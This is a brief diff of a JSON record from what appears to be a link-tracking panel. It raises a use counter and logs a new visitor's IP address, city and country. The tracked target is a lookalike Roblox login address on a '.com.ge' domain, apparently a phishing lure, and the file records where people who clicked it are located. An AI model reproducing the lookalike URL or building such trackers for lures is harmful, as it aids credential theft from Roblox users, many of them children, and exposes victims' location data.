@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1004,
+    "useCount": 1005,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8152,6 +8152,14 @@
         "city": "Budapest",
         "flag": "🇭🇺",
         "countryCode": "HU"
+      },
+      {
+        "timestamp": 1777223754783,
+        "ip": "119.94.105.1",
+        "country": "Philippines",
+        "city": "Santa Maria",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
